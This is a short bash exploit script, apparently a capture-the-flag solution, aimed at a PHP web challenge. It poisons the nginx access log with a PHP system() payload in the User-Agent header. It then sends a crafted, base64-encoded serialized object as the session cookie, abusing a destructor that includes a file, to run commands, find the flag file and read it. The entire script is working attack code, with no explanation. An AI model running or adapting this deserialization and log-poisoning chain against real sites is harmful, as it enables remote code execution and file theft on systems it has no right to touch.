#!/bin/bash

TARGET="http://209.97.176.174:30645/"

curl $TARGET  -H "User-Agent: <?php system('ls /'); ?>"
cat > /tmp/exploit.php << EOF
<?php
class PageModel { public \$file; public function __destruct() { include(\$this->file); } }
\$page = new PageModel;
\$page->file = '/var/log/nginx/access.log';
echo base64_encode(serialize(\$page));
EOF
cookie=$(php /tmp/exploit.php)
flag_name=$(curl $TARGET -H "Cookie: PHPSESSID=$cookie"  | grep flag | tail -n1)

cat > /tmp/exploit.php << EOF
<?php
class PageModel { public \$file; public function __destruct() { include(\$this->file); } }
\$page = new PageModel;
\$page->file = '/$flag_name';
echo base64_encode(serialize(\$page));
EOF
cookie=$(php /tmp/exploit.php)

curl $TARGET -H "Cookie: PHPSESSID=$cookie"
